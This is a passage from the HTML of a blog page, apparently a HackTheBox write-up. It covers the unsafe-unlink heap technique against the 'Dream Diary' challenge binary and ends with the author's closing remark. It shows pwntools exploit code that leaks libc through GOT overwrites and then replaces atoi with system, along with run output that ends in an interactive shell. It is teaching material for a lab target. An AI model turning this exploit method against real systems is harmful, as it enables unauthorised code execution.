+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;LIBC                 :    0x</span><span class="si">%x</span><span class="s2">&#34;</span> <span class="o">%</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
+</span></span></code></pre></div><p>Running the exploit now, we will have the LIBC leak:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="mi">0</span> <span class="p">[</span><span class="mi">13</span><span class="p">:</span><span class="mi">26</span><span class="p">:</span><span class="mi">50</span><span class="p">]</span> <span class="n">vagrant</span><span class="nd">@oracle</span><span class="p">(</span><span class="n">oracle</span><span class="p">)</span> <span class="n">HackTheBox</span><span class="o">&gt;</span> <span class="n">python3</span> <span class="n">chapter1</span><span class="o">.</span><span class="n">py</span> 
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Starting</span> <span class="n">program</span> <span class="s1">&#39;./chapter1&#39;</span><span class="p">:</span> <span class="n">PID</span> <span class="mi">2449</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Analyzing</span> <span class="o">/</span><span class="n">media</span><span class="o">/</span><span class="n">sf_Pwning</span><span class="o">/</span><span class="n">HackTheBox</span><span class="o">/</span><span class="n">chapter1</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Analyzing</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">vagrant</span><span class="o">/</span><span class="n">tools</span><span class="o">/</span><span class="n">LibcSearcher</span><span class="o">/</span><span class="n">libc</span><span class="o">-</span><span class="n">database</span><span class="o">/</span><span class="n">db</span><span class="o">/</span><span class="n">libc6_2</span><span class="mf">.23</span><span class="o">-</span><span class="mi">0</span><span class="n">ubuntu10_amd64</span><span class="o">.</span><span class="n">so</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Created</span> <span class="mi">5</span> <span class="n">chunks</span> <span class="n">of</span> <span class="n">size</span><span class="p">:</span> <span class="mh">0x88</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Preparing</span> <span class="n">a</span> <span class="n">fake</span> <span class="n">chunk</span><span class="o">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Fake</span> <span class="n">chunk</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">00000000</span><span class="p">:</span>  <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>  <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>  <span class="o">|................|</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">00000010</span><span class="p">:</span>  <span class="n">c0</span> <span class="mi">20</span> <span class="mi">60</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>  <span class="n">c8</span> <span class="mi">20</span> <span class="mi">60</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>  <span class="o">|.</span> <span class="err">`</span><span class="o">......</span> <span class="err">`</span><span class="o">.....|</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">00000020</span><span class="p">:</span>  <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span>  <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span>  <span class="o">|</span><span class="n">XXXXXXXXXXXXXXXX</span><span class="o">|</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">00000030</span><span class="p">:</span>  <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span>  <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span>  <span class="o">|</span><span class="n">XXXXXXXXXXXXXXXX</span><span class="o">|</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">00000040</span><span class="p">:</span>  <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span>  <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span>  <span class="o">|</span><span class="n">XXXXXXXXXXXXXXXX</span><span class="o">|</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">00000050</span><span class="p">:</span>  <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span>  <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span>  <span class="o">|</span><span class="n">XXXXXXXXXXXXXXXX</span><span class="o">|</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">00000060</span><span class="p">:</span>  <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span>  <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span>  <span class="o">|</span><span class="n">XXXXXXXXXXXXXXXX</span><span class="o">|</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">00000070</span><span class="p">:</span>  <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span>  <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span>  <span class="o">|</span><span class="n">XXXXXXXXXXXXXXXX</span><span class="o">|</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">00000080</span><span class="p">:</span>  <span class="mi">80</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>  <span class="mi">90</span>                       <span class="o">|.........|</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Editing</span> <span class="n">chunk</span> <span class="mi">3</span> <span class="k">with</span> <span class="n">a</span> <span class="n">fakr</span> <span class="n">chunk</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Triggering</span> <span class="n">Unlink</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Changing</span> <span class="n">freegot</span> <span class="n">to</span> <span class="nb">print</span><span class="nd">@plt</span> <span class="k">for</span> <span class="n">LIBC</span> <span class="n">Leak</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Getting</span> <span class="n">__libc_start_main</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">__libc_start_main</span><span class="o">+</span><span class="mi">240</span><span class="p">:</span>    <span class="mh">0x7f01b54d3840</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">LIBC</span>                 <span class="p">:</span>    <span class="mh">0x7f01b54b3010</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Switching</span> <span class="n">to</span> <span class="n">interactive</span> <span class="n">mode</span>
+</span></span><span class="line"><span class="cl"><span class="n">Done</span><span class="err">!</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">+------------------------------+</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>         <span class="n">Dream</span> <span class="n">Diary</span>          <span class="o">|</span>
+</span></span><span class="line"><span class="cl"><span class="o">+------------------------------+</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="n">Allocate</span>                 <span class="o">|</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="n">Edit</span>                     <span class="o">|</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="n">Delete</span>                   <span class="o">|</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="n">Exit</span>                     <span class="o">|</span>
+</span></span><span class="line"><span class="cl"><span class="o">+------------------------------+</span>
+</span></span></code></pre></div><p>Now, all left is to calculate the <code>system</code> address and then overwrite another GOT entry with the <code>system</code> address and enjoy the shell:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">function</span><span class="p">(</span><span class="s2">&#34;system&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#system = system.replace(b&#34;\x7f&#34;, b&#34;\x16\x7f&#34;)</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">(</span><span class="s2">&#34;atoi&#34;</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">system</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;&gt;&gt; &#34;</span><span class="p">,</span> <span class="s2">&#34;sh&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><p>Now, running the final exploit:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="mi">0</span> <span class="p">[</span><span class="mi">13</span><span class="p">:</span><span class="mi">30</span><span class="p">:</span><span class="mi">14</span><span class="p">]</span> <span class="n">vagrant</span><span class="nd">@oracle</span><span class="p">(</span><span class="n">oracle</span><span class="p">)</span> <span class="n">HackTheBox</span><span class="o">&gt;</span> <span class="n">python3</span> <span class="n">chapter1</span><span class="o">.</span><span class="n">py</span> 
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Starting</span> <span class="n">program</span> <span class="s1">&#39;./chapter1&#39;</span><span class="p">:</span> <span class="n">PID</span> <span class="mi">2677</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Analyzing</span> <span class="o">/</span><span class="n">media</span><span class="o">/</span><span class="n">sf_Pwning</span><span class="o">/</span><span class="n">HackTheBox</span><span class="o">/</span><span class="n">chapter1</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Analyzing</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">vagrant</span><span class="o">/</span><span class="n">tools</span><span class="o">/</span><span class="n">LibcSearcher</span><span class="o">/</span><span class="n">libc</span><span class="o">-</span><span class="n">database</span><span class="o">/</span><span class="n">db</span><span class="o">/</span><span class="n">libc6_2</span><span class="mf">.23</span><span class="o">-</span><span class="mi">0</span><span class="n">ubuntu10_amd64</span><span class="o">.</span><span class="n">so</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Created</span> <span class="mi">5</span> <span class="n">chunks</span> <span class="n">of</span> <span class="n">size</span><span class="p">:</span> <span class="mh">0x88</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Preparing</span> <span class="n">a</span> <span class="n">fake</span> <span class="n">chunk</span><span class="o">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Fake</span> <span class="n">chunk</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">00000000</span><span class="p">:</span>  <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>  <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>  <span class="o">|................|</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">00000010</span><span class="p">:</span>  <span class="n">c0</span> <span class="mi">20</span> <span class="mi">60</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>  <span class="n">c8</span> <span class="mi">20</span> <span class="mi">60</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>  <span class="o">|.</span> <span class="err">`</span><span class="o">......</span> <span class="err">`</span><span class="o">.....|</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">00000020</span><span class="p">:</span>  <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span>  <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span>  <span class="o">|</span><span class="n">XXXXXXXXXXXXXXXX</span><span class="o">|</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">00000030</span><span class="p">:</span>  <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span>  <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span>  <span class="o">|</span><span class="n">XXXXXXXXXXXXXXXX</span><span class="o">|</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">00000040</span><span class="p">:</span>  <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span>  <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span>  <span class="o">|</span><span class="n">XXXXXXXXXXXXXXXX</span><span class="o">|</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">00000050</span><span class="p">:</span>  <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span>  <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span>  <span class="o">|</span><span class="n">XXXXXXXXXXXXXXXX</span><span class="o">|</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">00000060</span><span class="p">:</span>  <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span>  <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span>  <span class="o">|</span><span class="n">XXXXXXXXXXXXXXXX</span><span class="o">|</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">00000070</span><span class="p">:</span>  <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span>  <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span> <span class="mi">58</span>  <span class="o">|</span><span class="n">XXXXXXXXXXXXXXXX</span><span class="o">|</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">00000080</span><span class="p">:</span>  <span class="mi">80</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>  <span class="mi">90</span>                       <span class="o">|.........|</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Editing</span> <span class="n">chunk</span> <span class="mi">3</span> <span class="k">with</span> <span class="n">a</span> <span class="n">fakr</span> <span class="n">chunk</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Triggering</span> <span class="n">Unlink</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Changing</span> <span class="n">freegot</span> <span class="n">to</span> <span class="nb">print</span><span class="nd">@plt</span> <span class="k">for</span> <span class="n">LIBC</span> <span class="n">Leak</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Getting</span> <span class="n">__libc_start_main</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">__libc_start_main</span><span class="o">+</span><span class="mi">240</span><span class="p">:</span>    <span class="mh">0x7f89ceb6c840</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">LIBC</span>                 <span class="p">:</span>    <span class="mh">0x7f89ceb4c010</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Switching</span> <span class="n">to</span> <span class="n">interactive</span> <span class="n">mode</span>
+</span></span><span class="line"><span class="cl"><span class="n">Invalid</span> <span class="n">choice</span><span class="err">!</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">+------------------------------+</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>         <span class="n">Dream</span> <span class="n">Diary</span>          <span class="o">|</span>
+</span></span><span class="line"><span class="cl"><span class="o">+------------------------------+</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="n">Allocate</span>                 <span class="o">|</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="n">Edit</span>                     <span class="o">|</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="n">Delete</span>                   <span class="o">|</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="n">Exit</span>                     <span class="o">|</span>
+</span></span><span class="line"><span class="cl"><span class="o">+------------------------------+</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;</span> <span class="err">$</span> 
+</span></span><span class="line"><span class="cl"><span class="err">$</span> <span class="n">whoami</span>
+</span></span><span class="line"><span class="cl"><span class="n">vagrant</span>
+</span></span><span class="line"><span class="cl"><span class="err">$</span> 
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Interrupted</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Stopped</span> <span class="n">program</span> <span class="s1">&#39;./chapter1&#39;</span>
+</span></span></code></pre></div><p>And that was it, congratulations, now you learned the Unsafe Unlink, as my blog was silent for a while, this was in draft so here it is now.</p>
+
+      </div>
+    </section>
+    <footer class="max-w-prose pt-8 print:hidden">
+      
+  <div class="flex">
+    
+    
+    
+    <div class="place-self-center">
+      
+      
+      <div class="text-2xl sm:text-lg">
+</div>
+    </div>
+  </div>
+
+
+      
+
+      
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="group flex" href="/blog/hacktivitycon-pwn/">
+              <span
+                class="me-2 text-neutral-700 transition-transform group-hover:-translate-x-[2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+                ><span class="ltr:inline rtl:hidden">&larr;</span
+                ><span class="ltr:hidden rtl:inline">&rarr;</span></span
+              >
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >Hacktivitycon - Pwn challenges</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2020-08-01 00:00:00 &#43;0000 UTC">1 August 2020</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+            <a class="group flex text-right" href="/blog/ropetwo-hackthebox/">
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >HTB: RopeTwo Writeup</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2021-01-03 00:00:00 &#43;0000 UTC">3 January 2021</time>
+                  
+                </span>
+              </span>
+              <span
+                class="ms-2 text-neutral-700 transition-transform group-hover:-translate-x-[-2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+                ><span class="ltr:inline rtl:hidden">&rarr;</span
+                ><span class="ltr:hidden rtl:inline">&larr;</span></span
+              >
+            </a>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+      
+    </footer>
+  </article>
+
+        
+          <div class="pointer-events-none absolute bottom-0 end-0 top-[100vh] w-12">
+            <a
+              href="#the-top"
+              class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+              aria-label="Scroll to top"
+              title="Scroll to top"
+            >
+              &uarr;
+            </a>
+          </div>
+        
+      </main><footer class="py-10 print:hidden">
+  
+  
+  <div class="flex items-center justify-between">
+    <div>
+      
+      
+        <p class="text-sm text-neutral-500 dark:text-neutral-400">
+            &copy;
+            2024
+            
+        </p>
+      
+      
+      
+        <p class="text-xs text-neutral-500 dark:text-neutral-400">
+          
+          
+          Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+            href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href="https://github.com/jpanther/congo" target="_blank" rel="noopener noreferrer">Congo</a>
+        </p>
+      
+    </div>
+    <div class="flex flex-row items-center">
+      
+      
+      
+      
+    </div>
+  </div>
+  
+  
+</footer>
+
+    </div>
+  </body>
+</html>
